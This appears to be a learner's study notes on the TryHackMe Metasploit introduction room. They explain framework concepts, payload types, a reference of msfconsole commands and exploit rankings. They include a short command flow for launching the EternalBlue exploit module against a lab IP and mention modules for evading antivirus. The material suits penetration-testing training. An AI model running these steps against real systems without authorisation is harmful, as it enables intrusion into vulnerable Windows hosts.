# Metasploit: Introduction

> TryHackMe | Cyber Security 101  
> Room: [Metasploit Introduction](https://tryhackme.com/room/metasploitintro)

---

## 📌 Overview

Metasploit is the most widely used exploitation framework in penetration testing.
This room covers the Metasploit Framework (open-source, CLI-based) — not the
commercial Pro version.

The exploitation process has three main steps:
1. **Find** the exploit
2. **Customize** the exploit (set parameters)
3. **Exploit** the vulnerable service

---

## 🧠 Core Concepts

### What is Metasploit?

A framework that supports all phases of a pentest: information gathering,
scanning, exploitation, post-exploitation. Also used for vulnerability research
and exploit development.

**Two versions:**
- **Metasploit Pro** — commercial, has GUI, automates tasks
- **Metasploit Framework** — open-source, CLI, this is what we use

**Three main components:**
- `msfconsole` — the main CLI interface
- **Modules** — exploits, scanners, payloads, etc.
- **Tools** — standalone tools like `msfvenom`, `pattern_create`, `pattern_offset`

---

### Key Terms

| Term | Definition |
|------|-----------|
| **Exploit** | Code that takes advantage of a vulnerability |
| **Vulnerability** | A flaw in design, code, or logic of a target system |
| **Payload** | Code that runs on the target *after* the exploit succeeds |

> 💡 Think of it this way: the exploit is the key, the vulnerability is the
> lock, and the payload is what you do once the door is open.

---

### Module Categories

| Module | Purpose |
|--------|---------|
| **Auxiliary** | Scanners, crawlers, fuzzers — supporting tasks |
| **Encoders** | Encode exploit/payload to evade signature-based AV |
| **Evasion** | Actively attempt to bypass antivirus |
| **Exploits** | Organized by target system |
| **NOPs** | No-operation buffer (0x90) for consistent payload size |
| **Payloads** | Code to run on target |
| **Post** | Post-exploitation modules |

---

### Payload Types

Under `/payloads` there are 4 subdirectories:

- **Adapters** — wraps a single payload into another format (e.g. Powershell)
- **Singles** — self-contained, no download needed (e.g. add user, launch notepad)
- **Stagers** — sets up connection channel first, then pulls down the rest
- **Stages** — the "rest" that stagers download

**How to tell single vs staged payloads:**
```
generic/shell_reverse_tcp        ← single: underscore between shell_reverse
windows/x64/shell/reverse_tcp   ← staged: slash between shell/reverse
```

---

## ⌨️ msfconsole Command Reference

### 🔹 Launch & Navigation

| Command | Meaning |
|---------|---------|
| `msfconsole` | Launch Metasploit Framework |
| `back` | Exit current module context, return to msf6 prompt |
| `history` | Show previously typed commands |
| `clear` | Clear terminal screen |
| `exit` | Quit msfconsole |

---

### 🔹 Search & Select Module

| Command | Meaning |
|---------|---------|
| `search <keyword>` | Search modules by name, CVE, or platform |
| `search type:auxiliary telnet` | Filter search by module type |
| `search cve:2017-0144` | Search by CVE number |
| `use <module_path>` | Select a module to use |
| `use <number>` | Select module by result number from `search` |
| `info` | Show detailed info about the current module |
| `info <module_path>` | Show info without entering module context |

> ⚠️ `info` is not a help menu — it shows author, sources, references, and
> technical details about the module.

---

### 🔹 Configure Module Parameters

| Command | Meaning |
|---------|---------|
| `show options` | List all parameters for the current module |
| `show payloads` | List compatible payloads for current exploit |
| `show <type>` | List all modules of a type (auxiliary, exploit, payload...) |
| `set <PARAM> <value>` | Set a parameter for the current module context only |
| `unset <PARAM>` | Clear a specific parameter |
| `unset all` | Clear all set parameters |
| `setg <PARAM> <value>` | Set a parameter **globally** — persists across all modules until `unsetg` or exit |
| `unsetg <PARAM>` | Clear a globally set parameter |

> 💡 **`set` vs `setg`:**  
> `set` → only applies to the current module. Switch module = lose the value.  
> `setg` → applies to all modules until you run `unsetg` or exit msfconsole.  
> Use `setg` when you know RHOSTS/LHOST won't change across your session.

---

### 🔹 Run & Exploit

| Command | Meaning |
|---------|---------|
| `exploit` | Launch the current module |
| `run` | Alias for `exploit` (used for non-exploit modules like scanners) |
| `exploit -z` | Run exploit and **automatically background** the session when it opens |
| `check` | Check if target is vulnerable **without exploiting** (not all modules support this) |

---

### 🔹 Session Management

| Command | Meaning |
|---------|---------|
| `sessions` | List all active sessions |
| `sessions -i <id>` | Interact with a specific session by ID |
| `background` | Background the current session, return to msfconsole prompt |
| `CTRL+Z` | Shortcut to background the current session |

> 💡 A **session** is the communication channel established between your machine
> and the target after a successful exploit. You can have multiple sessions open
> at the same time and switch between them.

---

## 🔍 Important Parameters

| Parameter | Meaning |
|-----------|---------|
| `RHOSTS` | Target IP. Supports single IP, CIDR (`/24`), range (`10.x–10.y`), or `file:/path/targets.txt` |
| `RPORT` | Port on target running the vulnerable service |
| `LHOST` | Your machine's IP — used for reverse shells to call back to |
| `LPORT` | Your machine's port to receive the reverse shell connection |
| `PAYLOAD` | Which payload to use with the exploit |
| `SESSION` | ID of an existing session — used by post-exploitation modules |

---

## 🖥️ Prompt Types — Know Where You Are

```
msf6 >                                    # msfconsole, no module loaded
msf6 exploit(windows/smb/ms17_010) >     # inside a module context
meterpreter >                             # Meterpreter shell on target
C:\Windows\system32>                      # raw command shell on target
```

> ⚠️ Prompt = context. Commands available to you depend on which prompt you are in.
> You cannot run module-specific commands from the raw `msf6 >` prompt.

---

## 📊 Exploit Ranking

Always check the rank before running an exploit — especially against production systems.

| Rank | Meaning |
|------|---------|
| **ExcellentRanking** | Will never crash the service (e.g. SQLi, CMDi, RFI, LFI) |
| **GreatRanking** | Has default target AND auto-detects or uses version-specific return address |
| **GoodRanking** | Works on common/default targets (e.g. English Windows 7) |
| **NormalRanking** | Reliable but version-specific, cannot reliably auto-detect |
| **AverageRanking** | Generally unreliable or difficult to exploit |
| **LowRanking** | Under 50% success rate on common platforms |
| **ManualRanking** | Basically a DoS; unstable — only works with specific manual configuration |

> Source: [Metasploit Exploit Ranking](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

---

## 🧪 Practical Flow: MS17-010 EternalBlue

```bash
# 1. Search for the exploit
msf6 > search eternalblue

# 2. Select the exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# or
msf6 > use 0

# 3. Check parameters
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 4. Set target IP globally so it persists if we switch modules
msf6 exploit(...) > setg RHOSTS 10.10.10.1

# 5. (Optional) Check if target is vulnerable before running
msf6 exploit(...) > check

# 6. Run the exploit
msf6 exploit(...) > exploit
# or background the session immediately
msf6 exploit(...) > exploit -z

# 7. Manage sessions
msf6 > sessions
msf6 > sessions -i 1
```

> **EternalBlue background:** An exploit allegedly developed by the NSA targeting
> a vulnerability in SMBv1 on Windows systems. Leaked by Shadow Brokers in April
> 2017. Used in the WannaCry ransomware attack in May 2017.

---

## 💡 Insights & Things to Remember

**The `set` vs `setg` trap:**  
The most common mistake — you set RHOSTS, switch to a scanner module, and
wonder why it's empty. Use `setg` when your target IP won't change across the
session. Use `set` when you need per-module control.

**`exploit` vs `run`:**  
They do the same thing. `run` exists because typing `exploit` when you're
running a port scanner feels wrong. Either works anywhere.

**Context is everything:**  
Metasploit is context-driven. Parameters, `show options`, and available commands
all depend on which module you're in. When something doesn't work, check your
prompt first.

**Rank before you run:**  
An `AverageRanking` or `ManualRanking` exploit against a live system can crash
it. In a real engagement, crashing a production service is worse than not
exploiting it.

---

## ⚖️ Reflection

**What clicked:**
- The session management flow — exploiting → backgrounding → switching between
  sessions is central to how real pentests work
- `exploit -z` is a small but useful flag I'd easily miss without reading carefully
- Staged vs single payload distinction (`/` vs `_`) is easy to forget but matters
  when selecting payloads for size-constrained environments

**Still unclear:**
- How does Meterpreter differ from a raw shell in practice? What can I do in
  one that I can't in the other?
- When does `check` actually work vs when is it unsupported?
- In a real engagement, how do you decide between a staged and single payload?

**Next:**
- Meterpreter deep dive
- Run EternalBlue against a THM lab target hands-on
- Explore post-exploitation modules

---

## 📚 References

- [TryHackMe - Metasploit Introduction](https://tryhackme.com/room/metasploitintro)
- [Metasploit Exploit Ranking](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)
- [Offensive Security - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
